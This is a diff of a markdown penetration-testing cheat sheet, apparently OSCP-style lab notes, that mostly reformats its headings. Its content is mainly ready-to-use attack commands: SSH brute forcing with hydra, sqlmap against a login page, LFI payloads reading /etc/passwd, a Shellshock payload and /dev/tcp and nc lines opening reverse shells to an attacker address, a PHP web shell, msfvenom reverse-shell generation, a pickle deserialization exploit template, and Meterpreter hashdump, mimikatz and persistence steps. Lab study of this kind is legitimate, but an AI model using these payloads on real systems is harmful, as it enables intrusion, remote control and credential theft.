@@ -14,7 +14,7 @@ Also make sure to run a udp scan with:
 nmap -sU -sV
 
 Go for low hanging fruits by looking up exploits for service versions.
-#### Http site
+## Http site
 * nikto -h
 * dirbuster / wfuzz
 * Burp
@@ -31,7 +31,7 @@ If you find an MD5 or some other hash - try to crack it quickly
 When source or directry listing is available check for credentials for things like DB.
 
 ---
-# Enum
+## Enum
 `netdiscover -r 10.11.1.0/24`
 
 OS
@@ -112,8 +112,8 @@ http-post-form "\<url>:\<post data>:F=\<fail text:H=\<header>"
 `hydra -l root -P /root/rockyou.txt 10.11.1.71 ssh`
 
 ---
-# Exploit
-SQLMAP
+# Misc 
+## SQLMAP
 
 `sqlmap -u http://192.168.1.15:8008/unisxcudkqjydw/vulnbank/client/login.php --method POST --data "username=1&password=pass" -p "username,password" --cookie="PHPSESSID=crp8r4pq35vv0fm1l5td32q922" --dbms=MySQL --text-only --level=5 --risk=2`
 
@@ -130,13 +130,11 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.235 LPORT=443 -f c –e x86/
 From [https://netsec.ws/?p=331](https://netsec.ws/?p=331)
 
 ---
-# Misc 
-
-#### Linux
+## Linux
 `cut -c2-`	cut the first 2 characters
 rev:
 `cat foo|rev`	reverse contents of cat
-#### Python
+## Python
 Rev shell
 ```python
 import socket
@@ -149,7 +147,8 @@ Python eval() and 2.7 read() exploit:
 
 `__import__("os").system("netstat -antp|nc 192.168.203.130 1234")`
 
-##### Deserialization (Pickle) exploit template
+__Deserialization (Pickle) exploit template__
+
 ```python
 def create_command(cmd, args, flags):
     template = """csubprocess
@@ -163,19 +162,38 @@ ltR."""
 hack = create_command('ls', '..', '-la')
 ```
 
-Port knocking 
+__Port knocking__
 
 `for x in 27017 28017; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.11.1.237; done`
-#### PHP
+
+__Python script to read from port template__
+```bash
+#!/usr/bin/env python
+import socket
+
+IP = '10.11.1.8'
+PORT = 631
+MSG = open('a').read()
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((IP, PORT))
+data = s.recv(1024)
+s.send(MSG)
+print data1
+data2 = s.recv(1024)
+print data2
+s.close()
+```
+## PHP
 Covert LFI to see php code:
 
 `http://10.11.1.24/classes/phpmailer/class.cs_phpmailer.php?classes_dir=/etc/passwd%00`
 `http://10.11.1.24/classes/phpmailer/class.cs_phpmailer.php?classes_dir=php://filter/convert.base64-encode/resource=../../../../../var/www/image.php%00`
-#### WordPress
+## WordPress
 `wpscan --url http://192.168.110.181:69 --enumerate u`
 to enumerate and bruteforce users based on wordlist use:
 `wpscan -u 10.11.1.234 --wordlist /usr/share/wordlists/rockyou.txt --threads 50`
-#### Samaba Share
+## Samaba Share
 ```bash
 smbclient -L host
 smbclient \\\\zimmerman\\public mypasswd
@@ -214,7 +232,7 @@ ShellShock over http when you get response from cgi-bin which have server info o
 
 `wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.11.0.235\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2>&1" http://10.11.1.71/cgi-bin/admin.cgi`
 
-#### Bruteforce
+## Bruteforce
 user fcrackzip to brute force zip
 
 `cewl http://10.11.1.39/otrs/installer.pl>>cewl`
@@ -227,7 +245,7 @@ Check cert:
 
 `openssl s_client -connect 10.11.1.35:443`
 
-##### Password Cracking
+### Password Cracking
 Wordpress password crack - [https://github.com/micahflee/phpass_crack](https://github.com/micahflee/phpass_crack) - see .251
 
 `cat /usr/share/wordlists/rockyou.txt | python /root/labs/251/phpass_crack-master/phpass_crack.py pass.txt -v`
@@ -237,7 +255,7 @@ it seems john does a better job at php password cracking when using a wordlist
 
 `echo gibs@noobcomp.com:$P$BR2C9dzs2au72.4cNZfJPC.iV8Ppj41>pass.txt`
 
-#### Encoding
+## Encoding
 HexToASCII
 
 `echo -n 666c6167307b7468655f717569657465 |xxd -r -p`
@@ -250,25 +268,6 @@ Convert windows file to linux
 
 PUT to webserver:
 Use poster Ctrl+Alt+P in Firefox and set url containg file path and chose file and PUT.
-
-##### Python script to read from port template
-```bash
-#!/usr/bin/env python
-import socket
-
-IP = '10.11.1.8'
-PORT = 631
-MSG = open('a').read()
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((IP, PORT))
-data = s.recv(1024)
-s.send(MSG)
-print data1
-data2 = s.recv(1024)
-print data2
-s.close()
-```
 
 zip all files in this folder
 `zip -r zipped.zip .`
@@ -342,7 +341,7 @@ To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port
 You’ll need to authorise the target to connect to you (command also run on your host):
 `xhost +targetip`
 
-#### PHP web shell
+## PHP web shell
 `<pre><?php echo shell_exec($_GET['c']);?><pre/>` In base 64 `PHByZT48P3BocCBlY2hvIHNoZWxsX2V4ZWMoJF9HRVRbJ2MnXSk7Pz48cHJlLz4K`
 
 `cmd.exe >& /dev/tcp/10.11.0.235/80 0>&1`
@@ -350,7 +349,7 @@ You’ll need to authorise the target to connect to you (command also run on you
 ---
 # Metasploit
 
-#### msfconsole
+## msfconsole
 
 ```
 set exploit/name #select exploit
@@ -362,7 +361,7 @@ session -i 2 #interact with session number 2
 # Ctrl+Z - send session to background
 ```
 
-##### Meterperter
+### Meterperter
 `sysinfo` #display info
 
 ```hashdump
@@ -370,12 +369,12 @@ getuid
 getsystem #windows only
 ```
 
-##### POST
+### POST
 `meterpereter> use mimikatz`
 
 `help mimikatz`
 
-#### Msfvenom
+## Msfvenom
 ```bash
 msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.11.0.235 LPORT=1234 –e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f js_le>shell
 msfvenom -p windows/shell_bind_tcp  -f exe >labs/31/shell.exe
@@ -510,7 +509,7 @@ set payload bsd/x64/exec                     set payload bsd/x64/shell_reverse_i
 set payload bsd/x64/shell_bind_ipv6_tcp      set payload bsd/x64/shell_reverse_tcp        set payload bsd/x86/metsvc_reverse_tcp       set payload bsd/x86/shell/reverse_tcp        set payload bsd/x86/shell_reverse_tcp_ipv6
 ```
 
-Persistence:
+### Persistence
 
 `meterpreter > run persistence -h`
 
@@ -626,7 +625,7 @@ Successfully set SecurityTypes of REG_SZ.
 ```
 (Also try HKCU\Software\RealVNC\WinVNC4\SecurityTypes if above does not work)
 
-#### SMB
+## SMB
 service smbd start
 /root/smb is shared
 
@@ -641,7 +640,7 @@ root@kali:~# nmblookup -A 10.11.1.136
 smbclient -L \\host -I 10.11.1.136 -N
 smbclient  //host/Bob\ Share -I 10.11.1.136 -N
 ```
-#### MsSQL
+## MsSQL
 [https://www.iodigitalsec.com/2013/08/10/accessing-and-hacking-mssql-from-backtrack-linux/](https://www.iodigitalsec.com/2013/08/10/accessing-and-hacking-mssql-from-backtrack-linux/)
 
 ```
@@ -768,7 +767,7 @@ nasm > add eax,12
 ```
 write return address in the script return for x86 (LE)
 
-##### Python script
+## Python script
 ```py
 #!/usr/bin/python
 import socket
